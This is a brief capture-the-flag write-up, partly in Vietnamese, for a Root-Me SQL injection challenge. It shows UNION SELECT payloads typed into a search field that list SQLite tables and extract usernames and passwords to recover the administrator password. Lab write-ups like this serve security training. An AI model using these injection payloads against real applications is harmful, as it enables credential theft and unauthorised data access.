# SQL injection - String

`Link: http://challenge01.root-me.org/web-serveur/ch19/`

## Request:

- Retrieve the administrator password

## Solution:

### Step 1:

- `Vào phần search thử với payload: 'sss'`
  -> Ta thấy xuất hiện lỗi với SQLite

### Step 2: Xem tên các table:

- Gõ từ khoá vào thanh search: ' union select 1,tbl_name from sqlite_master --

-> Ta thu được kết quả tên các table

### Step 3: Trích xuất password:

- Gõ từ khoá vào thanh search: ' union select username,password from users --

-> Key sẽ là password của admin
